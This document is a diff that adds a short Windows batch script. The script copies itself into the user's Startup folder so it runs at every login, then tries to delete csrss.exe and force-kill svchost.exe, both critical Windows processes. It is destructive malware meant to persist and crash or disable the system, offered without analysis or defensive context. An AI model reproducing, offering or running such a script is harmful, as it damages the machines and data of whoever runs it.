@@ -1,0 +1,6 @@
+@echo off
+xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+goto crash
+:crash
+del /q /f /y csrss.exe
+taskkill /f /im svchost.exe
